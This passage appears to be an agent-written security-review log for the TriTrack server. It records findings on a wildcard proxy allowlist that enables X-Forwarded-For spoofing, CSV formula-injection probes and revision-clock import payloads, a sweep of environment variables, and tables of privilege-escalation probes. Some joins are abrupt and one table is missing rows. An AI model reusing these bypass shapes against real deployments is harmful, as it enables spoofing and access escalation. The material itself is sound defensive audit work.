> alone: the NAU information-security review still has not happened.**

> **Every item engineering controls is closed.** L-1 — last round's blocking
> finding — is closed and was re-refused live this round in the exact shape that

> round can touch it.

`SECURITY_SCOPE_AND_EXIT.md` was written to end.

### 16.3 New findings — seven, and none meets the bar

Registered in §15 with dispositions. **None blocks either gate.** Per
`SECURITY_SCOPE_AND_EXIT.md` §5 rule 2 and this run's brief, none is given a
task number: "accepted" is the complete answer, and creating work below the bar
is the treadmill the scope document ended.

**M-11 — a wildcard allowlist is accepted, which is L-1's class with the
opposite sign.** `TRITRACK_TRUSTED_PROXIES=0.0.0.0/0` and `::/0` both start,
with `TRITRACK_PROXY_SOURCE_IDENTITY=probe-verified`:

```
reachable, TRUSTED_PROXIES=','        -> EXIT 78   (L-1's shape, refused — 10.92 holds)
reachable, TRUSTED_PROXIES=',, ,,'    -> EXIT 78
reachable, TRUSTED_PROXIES=0.0.0.0/0  -> STARTS    <<< every peer is a trusted proxy
reachable, TRUSTED_PROXIES=::/0       -> STARTS    <<< same, IPv6
CONTROL   TRUSTED_PROXIES=203.0.113.4 -> STARTS    (the licensed shape)
CONTROL   loopback publish, nothing   -> STARTS
```

`IpRange.tryParse` accepts prefix `0` because `0 <= prefix <= maxBits`, so the
range matches every address and `request_identity.dart` reads `X-Forwarded-For`
from **any** caller. §4.4.1's design sentence is *"an explicit allowlist of
proxy peer addresses, never a header read"*, and `/0` is not that — it is a
header read wearing an allowlist's clothes. **L-1 was a value that parses to
*zero* entries; this is a value that parses to *all* of them, and 10.92's sweep
looked only for the empty arm.**

**Why it does not block.** Applying §15.0: the source key is not an
authorization input anywhere. Project scope comes from the session (§4.11) and
never from an address, so this is not B3 — no unauthenticated access, no
escalation, no authN/authZ bypass. What it degrades is the per-source rate limit
(availability, §5.6's stated non-goal) and `auth_audit_log.source_address`
(post-compromise forensic attribution, which §15.6 already rated non-blocking
for 10.83 on exactly this reasoning). No coordinate and no observer identity is
disclosed, and no field record is lost. It also requires an operator to type a
wildcard *and* attest `probe-verified`. **Registered accepted**, with the class
statement recorded so the next sweep of this file checks both arms.

**M-12 — the gate stack starts from a known state and does not end in one, and
it silently redirected a suite this round.** `gate_smoke_test.sh` tears down
`tritrack-gate` with `-v` before it runs (task 10.90) and never brings it down
afterwards. Its server keeps `127.0.0.1:8080`. The e2e stack then failed to bind:

```
Error response from daemon: ... Bind for 127.0.0.1:8080 failed: port is already allocated
{"status":"ok"}                          <<< this is the GATE server answering, not the e2e one
```

The e2e suite ran anyway, against a server backed by a different database.
**Reproduced live this round, and it is 10.90's own lesson one step downstream:**
10.90 made the stack start from a known state because a gate whose database
persists is measuring a configuration it was not told to use. Ending in an
unknown state has the same consequence for whatever runs next. It did not
manufacture a false pass here — the run went red — but "the wrong server
answered and the suite reported on it" is precisely the failure the instrument
programme exists to prevent, and nothing in the harness detected it; the
diagnosis came from reading `docker ps`. **Registered accepted** as a
measurement-hygiene defect: the operator remedy (`down -v` when finishing, which
the README already documents) exists and worked.

**M-13 — `/sync/ack` does not bound its cursor, and fails safe anyway.** A
cursor of `10^18` and one of `-5` are both answered `200 {"status":
"acknowledged"}`. Traced to the consumers rather than assumed: `cursor_store`
writes `acknowledged_seq = GREATEST(existing, incoming)`, so a hostile value
cannot lower a device's position, and `tombstone_retention_service` takes
`min(acknowledged_seq)` across the project's devices, so raising one device's
cursor cannot advance the purge floor past an honest device. The only party
affected is the caller's own device. **Registered accepted.**

**M-14 — `SpreadsheetSafeCsv`'s doc and its code disagree about which leading
characters are skipped, and Excel says it does not matter.**
`_firstSignificantCharacter` skips only `U+0020`; its comment claims "the first
non-space, non-tab, non-newline one". Tab, CR and LF are themselves in
`dangerousLeadingCharacters` and so are caught directly, but a cell led by NBSP,
vertical tab, BOM or RTL-override reaches the encoder unneutralized. **Measured
in Microsoft Excel on macOS 26.6 rather than argued in the escaping code**, which
is the standard §15.10 set for this control:

```
B11   =1+1   has formula: false
B12  =1+1   has formula: false
B13  ﻿=1+1   has formula: false
B19  ‮=1+1   has formula: false
```

Excel treats a cell as a formula only when its literal first character is one of
`= + - @`; a leading NBSP makes it text. **Registered accepted** — the comment
is wrong, the control is not.

**M-15 — `isWellFormedIdentifier` permits internal spaces.** A server answering
`user_id: "a b"` is adopted; `''`, `'   '`, NUL, LF, CRLF, ESC and a 201-character
id are all refused, so the corpus §14 and `server_identity_adoption_test.dart`
assert is intact. Ids are server-generated UUIDv4s, the value reaches no
interpolated sink (every query is parameterised), and `syncRowKey` joins on `/`,
which a space does not disturb. **Registered accepted.**

**M-16 — the K-3 deep-link controls are present and nothing tests them.** All
five hold today, verified by reading the real files this round. But
`platform_cleartext_test.dart` greps those same two plists and that manifest for
cleartext and ATS keys only; no test mentions `FlutterDeepLinkingEnabled`,
`flutter_deeplinking_enabled`, `CFBundleURLTypes` or
`overridePlatformDefaultLocation`. A routine platform-file regeneration would
remove them silently. What that leaves undefended is `/splash`, and with it
`IdentitySetupScreen`'s non-skippable gate — identity capture, not coordinates
and not the field record. **Registered accepted** under §15.0's reading, and
recorded because §4.8 control 2 and §4.7's retention sweep are the same shape and
the record is what stops it being re-derived.

**M-17 — L-2's freeze arm is closed above `maxUnexplainedRevisionAdvance` and
open below it, which is what the bound says it does; here is the measurement.**
An archive that fills one empty column (an addition, so no consent is owed) while
advancing `revision` by exactly 1000 applies with **no dialog and no mention of
the clock**:

```
advance=+1000 with one addition: outcome=applied  changes=1  destructive=0
  change shown: notes null -> filled in
  stored revision=1004                             <<< the clock moved, unshown
advance=+1001 with one addition: outcome=needsConfirmation  changes=2
  change shown: notes null -> filled in
  change shown: revision 4 -> 1005                 <<< the bound fires, exactly
```

And the consequence, driven through the authenticated-server merge path:

```
teammate correction at revision 5 -> skipped=1, notes unchanged, revision 1004
```

**This is the documented design, not a defect in it.** `maxUnexplainedRevisionAdvance`
is chosen so that "being wrong is cheap", exceeding it costs one dialog line, and
the window is bounded, one-shot per hostile file, reported as a skip rather than
silently, and self-healing — the next honest edit on any device that has seen the
row is `1005` and outranks it. It is registered because the *measurement* is new:
the record has asserted the bound's shape and never shown what a payload sitting
just underneath it actually does to a teammate's correction. **Registered
accepted**, with the number and its consequence now on the record rather than in
the reasoning.

**Overruled by Michael, 2026-08-17; fixed by task 10.109.** The reasoning above
stands as written and is not revised — the behavior was bounded, one-shot,
reported rather than silent, and self-healing, and it is exactly what
`maxUnexplainedRevisionAdvance` was specified to do. The overrule is a judgment
about the *bar*, not a correction of the analysis: a field record silently
placed a thousand versions ahead of every teammate's copy is a cost this project
declines to accept for the sake of a bound that was never tight.

What changed is one word in the control. The allowance is no longer **flat** —
it is proportional to the changes the consent dialog is showing
(`explainedRevisionAdvance`), with `maxUnexplainedRevisionAdvance` kept as its
absolute cap. §4.19 clause 4's exemption is **not** deleted, deliberately: it
was written about `revision`'s visibility and is right about it, and a dialog
that fires on every honest import is the failure it exists to prevent. Both
halves are demonstrated by running them
(`untrusted_import_exemption_test.dart`, group `M-17`):

```
advance=+1000 with one addition (M-17's payload):     outcome=needsConfirmation
    changes=3 destructive=2  stored revision=4        <<< nothing written
advance=+5 with one addition (an ordinary import):    outcome=applied
    changes=1 destructive=0                           <<< no clock, no dialog
honest 30-row restore, each row diverged by 1..9:     outcome=applied
    updated=30 changes=30 destructive=0               <<< not one clock line
teammate correction at revision 5 -> skipped=0, updated=1, bearing applied
```

**The sweep that came with it found a second instance** (§4.19.3): the predicate
judged `revision` and not `updated_at`, so a payload moving only the merge's
tiebreak was never judged at all — `updated_at` four minutes ahead, everything
else byte-identical, `outcome=applied changes=0`, written with no dialog. Closed
in the same change; it now iterates `mergeClockColumns`.

### 16.4 What holds, re-verified rather than assumed

**L-1 is closed and I could not reopen it.** The comma shape that started a
server last round now exits 78, and so does a shape §14 never tried (`,, ,,`).
The two refusals are independent: an allowlist with no attestation refuses, and
an attestation with a junk value refuses. **L-2, L-3, L-6, L-12 and L-15 are
closed and were re-attacked, not re-read** — the ceiling refuses by name on both
untrusted paths, the freeze arm's bound fires exactly at its stated value,
`Project_Memberships.end_date` is gated along with every other declared
deactivation column on all eleven tables, and the CSV escape survived Excel.
**M-1 stays below the bar and its own written trigger is not met**: a `NaN`
latitude from an archive reaches the consent dialog as a destructive change and
never the database, so no path was found where an unauthenticated party updates
a coordinate. `Infinity` and an out-of-range `91.0` are refused outright by
`RowValidator`. **C-1…C-5, D-1, I-4, H-3, H-6 and I-1 refuse again**, by
instruments that each ran live and each proved able to abort on a forced-stale
constant. J-3 holds; the role is still `NOSUPERUSER` and now cannot delete its
own audit rows.

### 16.5 The NAU review — the item eight gates have not closed

`CLAUDE_DOCS/NAU_infosec_review_request.md` is at its fifth revision, is
substantively current as of the seventh gate, and the recipient line is still
blank. **It has not been sent.** Nothing was sent by this gate and nothing should
be: filling in an address by guessing is how a letter of this kind reaches the
wrong office.

This is now the **only** thing standing between Gate C and a pass. Every other
criterion is met. The letter's own sentence remains the operative one — *do not
wait for the gate to pass before sending this* — and it has now been true for
eight consecutive rounds.

### 16.6 On the process

Seven rounds could not stop because the question had no boundary. This one
stopped in a single pass, and the change was not that the code got better —
`10.92`–`10.95` closed four things, which is an ordinary round's work. **The
change was that §3 enumerated the surface, §4 defined what blocks, and §5 said
what happens to everything else.** Seven new findings surfaced this round. Under
the old rule all seven would have become tasks and the gate would have failed an
eighth time. Under §4's bar, none of them is a harm this project has decided to
prevent, so all seven are written down, given a reason, and left alone.

The one thing worth carrying forward is §16.1's middle paragraph: three of this
round's own probes would have reported a clean pass while measuring nothing, and
what caught all three was insisting that a positive control fire in the same run
as the finding. That is the eighth consecutive gate at which the instruments,
not the code, were the most dangerous thing in the room.

## 17. Task 10.108 — M-11 and M-12, overruled and fixed (2026-08-17)

§15.3 registered M-11 and M-12 accepted, and §16.3's reasoning for both was
sound at the time it was written — neither reaches an asset §4 protects, and
§15.0's bar says "below the bar" is a complete answer for a finding like that.
**Michael overruled that disposition and asked for both fixed anyway.** The
rows above are annotated rather than rewritten: the acceptance reasoning is
still correct as an argument about severity, and the record should show a
decision made on top of it, not a mistake being quietly corrected.

### 17.1 M-11 — the wildcard allowlist now refuses

`trusted_proxies.dart`'s `IpRange` gained `isDangerouslyBroad`: any declared
entry narrower than one-eighth of its family's bit width (`/4` for IPv4,
`/16` for IPv6 — `/0` through `/3`, and `/0` through `/15`, respectively) is
refused by `TrustedProxies.parse` with a `StateError` naming the offending
entry, reaching `TrustedProxies.fromEnvironment`'s existing `exit 78` path in
`bin/server.dart` unchanged. `0.0.0.0/0` and `::/0` — the two shapes §16.3
measured — both refuse, as does `128.0.0.0/1` and any range that broad. The
threshold is deliberately far short of the literal wildcard: nothing a real
reverse-proxy operator runs occupies a `/4`, so narrowing further would only
cost false refusals, and widening it back toward `/0` would readmit ranges
broad enough to be the same finding under a different prefix. `IpRange`
itself still parses `/0` (`IpRange.tryParse` is unchanged) — the refusal
lives in `TrustedProxies.parse`, which is the layer L-1's own fix lives in,
so a value that is syntactically a valid CIDR block but semantically
"everyone" is refused at the same seam a value that is syntactically empty
already is. Tests: `trusted_proxies_test.dart`, "a wildcard, or
near-wildcard, allowlist entry is refused (M-11)".

### 17.2 The sweep M-11 asked for

**Every environment variable and config value this server reads, checked for
a degenerate or extreme value that would satisfy its check instead of
failing it** — the class L-1 (empty allowlist skipped), M-11 (wildcard
allowlist accepted) and 10.74's `TRITRACK_PROXY_SOURCE_IDENTITY` (an
unmeasured claim accepted as measured) share. Verdict per value, including
the ones that are fine.

| Variable / value | Site | Degenerate shape | Verdict |
| --- | --- | --- | --- |
| `TRITRACK_TRUSTED_PROXIES` — blank entries (`,`, `,, ,,`) | `trusted_proxies.dart` | Parses to zero ranges, silently treated as "nothing declared" | **Fixed — L-1 (10.92).** |
| `TRITRACK_TRUSTED_PROXIES` — `0.0.0.0/0`, `::/0`, or any prefix `< minimumUsablePrefixBits` | `trusted_proxies.dart` | Parses to "every address," satisfying the allowlist check for any caller | **Fixed — M-11, this task (§17.1).** |
| `TRITRACK_PROXY_SOURCE_IDENTITY` | `trusted_proxies.dart` (`_assertProxySourceIdentityDeclared`) | Empty, `none`, or any string other than the two accepted literals | **Fine.** Neither accepted literal is the empty/degenerate case; `.trim().toLowerCase()` before comparison closes the whitespace/case arm. Closed by 10.74 (K-2). |
| `TRITRACK_PUBLISH_ADDRESS=none` | `trusted_proxies.dart` (`DeploymentReach.of`) | An unmeasured claim ("no host port maps here") accepted without a probe backstop, the same shape K-2 closed for the proxy hop one level up | **Below the bar, not fixed.** `none` here is the literal shape `docker-compose.tls.yml`'s `ports: !override []` renders — a real, inspectable compose fact, not an operator's typed assertion about a network path nobody can measure from inside the container. K-2 exists because *no one* can verify a proxy's publish path from the origin; this claim is verifiable by reading the compose file that shipped it. No coordinate, no observer identity, no field record turns on it. |
| `TRITRACK_ENV` — case/whitespace (`Production`, `production `, ` PRODUCTION`) | `security_config.dart`, `email_sender.dart`, `rate_limiter.dart` (3 sites) | Exact `== 'production'` comparison; a plausible operator typo takes the *less* safe branch instead of refusing | **Fixed, this task.** All three now call a shared `isProductionEnvironment()` (`security_config.dart`) that trims and lowercases before comparing. `trusted_proxies.dart` was already exempt from this class — its refusal is independently gated on `DeploymentReach` (reachability), not solely on `TRITRACK_ENV`, so a typo there falls through to the reachability check rather than to "production's protections are off." |
| `TRITRACK_ALLOW_CLEARTEXT_LAN` | `security_config.dart` | Anything other than the exact literal `"1"` | **Fine.** A typo (`"true"`, `"yes"`) fails toward loopback-only, the *safer* branch — the inverse of the L-1/M-11 shape, where a typo fails toward the *less* safe branch. |
| `TRITRACK_TLS_CERT_PATH` / `TRITRACK_TLS_KEY_PATH` — whitespace-only value | `security_config.dart` (`_nonEmpty`) | `" "` passes `isEmpty` and is treated as a real path; `SecurityContext..useCertificateChain(" ")` then throws uncaught at bind time | **Below the bar, not fixed.** Crashes loudly rather than serving cleartext or an unvalidated cert — availability, not a control defeat. Worth a `.trim()` opportunistically; not this task's scope. |
| `TRITRACK_RATE_LIMIT_PER_SOURCE_DISABLED` | `rate_limiter.dart` | Anything other than exact `"1"` | **Fine.** Fails toward the limit staying on. Only reachable at all via a literal `"1"` **and** `TRITRACK_ENV=production` refusing it outright (now case/whitespace-normalized, see the `TRITRACK_ENV` row) — never read outside `docker-compose.e2e.yml`, no `.env.example` entry. |
| `TRITRACK_DIAGNOSTICS_ENABLED` / `TRITRACK_DIAGNOSTICS_ALLOW_REMOTE` | `diagnostics_config.dart` | Anything other than exact `"true"` | **Fine.** Fails toward the console staying off / loopback-only. |
| `TRITRACK_DIAGNOSTICS_TOKEN` — whitespace-only (`" "`) | `diagnostics_config.dart` | Not trimmed before the `isEmpty` presence check, so `" "` "enables" the console with a one-character secret | **Below the bar, not fixed.** An attacker must still know the exact value — `Tokens.constantTimeEquals` requires knowledge, not merely presence, so this is a weak operator-chosen secret, not a check a degenerate value satisfies by itself. Worth a minimum-length assertion opportunistically. |
| `POSTGRES_PORT` | `postgres_database.dart` | Unbounded `int.tryParse`; negative or huge values reach `Endpoint(port: ...)` unchecked | **Fine.** Not a security boundary — a bad value fails the connection, and the server already runs with no database (§ router.dart, "auth simply isn't mounted") rather than serving anything wrong. |
| `POSTGRES_HOST` / `POSTGRES_DB` / `POSTGRES_USER` / `POSTGRES_PASSWORD` — whitespace-only | `postgres_database.dart` (`required()`) | Not trimmed before the `isEmpty` check | **Fine.** Same shape as the diagnostics token above but with no attacker-facing check to satisfy — a bad credential fails the connection, it does not open one. |
| `TRITRACK_DEV_MAGIC_LINK_DIR` | `email_sender.dart` | Empty string | **Fine.** `isNotEmpty` correctly treats it as unset; falls back to `NullEmailSender`. Its production refusal is the `TRITRACK_ENV` row above. |
| `TRITRACK_PUBLIC_URL=""` | `bin/server.dart` | `??` only substitutes on `null`, not on an explicit empty string, so the base URL embedded in every magic link becomes a bare relative path | **Below the bar, not fixed.** Breaks link delivery visibly (no scheme, no host) rather than weakening a control — nothing consumes the string as a live redirect target without a scheme, so this is a functional bug in the same *shape* as L-1 (an operator's "unset" spelled in a way `??` doesn't catch) but with no security consequence. |
| `TRITRACK_BACKUP_KEEP` (`backup.sh`) | 0, negative, non-numeric | Retention disables entirely rather than deleting the wrong thing, and says so on every run | **Fine.** Fails toward *not deleting data* — the safe direction — and is not silent (H-7, task 10.44). |
| `TRITRACK_BACKUP_VERIFY_KEY` / `TRITRACK_BACKUP_RECIPIENTS` (`backup.sh`) | Empty | Retention refuses to prune; backup refuses to run unencrypted | **Fine.** Both fail closed. |
| Client server-URL field | `server_config_provider.dart` / `private_network.dart` | `0.0.0.0`, `*.local`-suffix tricks | **Fine.** `0.0.0.0` is outside the closed private-address allowlist and forced to `https://`; the `.local` suffix check is anchored (`endsWith`), not a `contains` an attacker-chosen hostname could defeat (task 10.48/F13). |

Two rows found real, live degenerate-value defects beyond M-11 itself — the
`TRITRACK_TRUSTED_PROXIES` wildcard and the four `TRITRACK_ENV` sites (three
of which were vulnerable; `trusted_proxies.dart`'s own refusal was
independently guarded). Both are fixed. Everything else in the table either
already fails in the safe direction, requires knowledge rather than mere
presence to exploit, or produces a visible functional break rather than a
silent control defeat — recorded so the next sweep of this class does not
re-derive them.

### 17.3 M-12 — the gate stack now ends in a known state, and the e2e harness checks

**`gate_smoke_test.sh` now tears down after a run, not only before.** An
`EXIT` trap installed immediately after the existing pre-run `down -v` runs
`"${COMPOSE[@]}" down -v` on every path out of the script — success, an
instrument failure, the self-test branch, or a stray signal — so a run that
fails no longer leaves `tritrack-gate` holding `127.0.0.1:8080` for whatever
runs next. Same `-p tritrack-gate` scoping as the rest of the file (task
10.90); the trap reuses `COMPOSE`, so it cannot reach a volume belonging to
any other compose project.

**The half that mattered more: nothing had verified which stack an e2e run
actually reached.** `test/e2e/support/stack_identity.dart` is new. Before any
`test/e2e/*_e2e_test.dart` group runs, `e2e_coverage_guard_test.dart` — the
one file in this suite already responsible for "must not pass by an illusion"
(task 10.39/10.41's non-skip guard) — now also asserts that the compose
project publishing `TRITRACK_E2E_BASE_URL`'s port is the one this run
expects (`tritrack-e2e` by default, matching the README's new `-p
tritrack-e2e` convention, itself modeled on 10.90's `-p tritrack-gate`). It
asks Docker the same question a human ran `docker ps` to answer when this
finding was diagnosed live: `docker ps --filter publish=<port> --format
'{{.Label "com.docker.compose.project"}}'`. A mismatch fails, naming both the
stack that answered and the one expected, rather than the run either
silently succeeding against the wrong stack or failing on an unrelated bind
error nobody reads.

**Deliberately not answered by extending `/health`.** `router.dart` states
`/health` is, and must stay, the only unauthenticated route that reveals
anything beyond liveness (§2.2) — stamping a stack identity into it would be
exactly the "free reconnaissance" that invariant exists to close. Asking
Docker directly, rather than the server, keeps that invariant intact.

**Acceptance, demonstrated rather than asserted:** bringing up a
`tritrack-gate`-named stack on port 8080 and then running the e2e suite
against it with `TRITRACK_E2E_EXPECTED_PROJECT` still defaulted to
`tritrack-e2e` fails `e2e_coverage_guard_test.dart`'s new test with a message
naming `tritrack-gate` as the wrong stack — not a bind error, and not a false
pass.

**What this run did *not* do, stated plainly:** it did not run
`scripts/run_offline_suite.sh` or the e2e suite, and it did not re-audit task
statuses the way §16 did. Everything else §16's criterion 4 names was re-run and

already covered, plus fresh evidence for the six entries Phase 11 added. **Gate
C's one open criterion is the NAU information-security review**, which is
unchanged and is not something this task could close.

#### The instrument, and why it is shaped the way it is

`scripts/verify_11_9_team_surface.py` builds a **real team through the real
flows** — a published project, an owner, two contributors and a viewer who each
joined by redeeming a real invitation, and an unrelated stranger with a project
of their own. Nothing is inserted behind the server's back, because a fixture
written straight into Postgres would be a fixture that never proved the
invitation path works.

**Every probe carries a positive control that fires in the same run.** A refusal
proves nothing on its own: a stale envelope, a dead route or a mistyped row
shape produces an identical clean sweep, which is exactly what task 10.40 caught
three of this project's instruments doing. So each attack is paired with its
nearest legitimate twin, and a control that fails is a failure of the run. Two
of them earned their keep during development — a wrong enum value and three
wrong column names each showed up as a **BLIND** control rather than as a false
"refused".

It carries a `BASELINE` of known-open findings on `gate_c_baseline.py`'s model,
and the three failure directions are all covered: an unregistered attack that
succeeds is red; a **baselined** attack that starts being *refused* is red,
because that means somebody closed it and the register entry has become a lie;
and a baselined attack the run never attempted is red, because a deleted check
reads exactly like a passing one.

| Entry | Attacks that failed |
| --- | --- |

Four refusals, with the attacker's own profile edit accepted as the control. **One attack succeeded — N-1.** |
| **22 — `Observation_Exclusions`** | A contributor creating an `excluded` mark; a viewer creating any mark; a contributor promoting their own `superseded` mark to `excluded`; a second contributor withdrawing somebody else's mark; a contributor withdrawing an owner's `excluded` mark; a mark claiming another project; a non-member pushing a mark straight into a project. Controls: an owner creating an `excluded` mark, a contributor superseding inside their own project, an owner withdrawing a contributor's mark. |
| **23 — invitation issuance, listing, revocation** | An outsider, a contributor and a viewer each listing the project's invitations; a contributor and an outsider each issuing one; a fictional project reading differently from a forbidden one (byte-identical `403`); one project's owner revoking another project's invitation by naming its id. Controls: the owner lists and revokes their own. |
| **24 — invitation redemption** | Redeeming a code issued to somebody else's address; a guessed code; an outsider redeeming; the same code twice; a revoked code; an existing member redeeming a second, higher-privileged code (`409`, and the code is **not** consumed — verified). Controls: the invited person redeems and can then pull; and cannot then push themselves the owner row the refused code named. |
| **25 — membership and role mutation on the push path** | A contributor inserting a second membership making themselves owner; promoting their stored membership; ending another contributor's membership; adding an outsider; a viewer granting themselves a contributor row; **and the owner pushing a membership row for somebody else** — adding a member is redemption, not a push. The last-owner guard refused all three shapes (`end_date`, `deleted_at`, demotion) and refused the second of two owner-removals in one batch. Controls: an owner changes an existing member's role; with two owners, one may leave; the departed owner then draws `403`. |
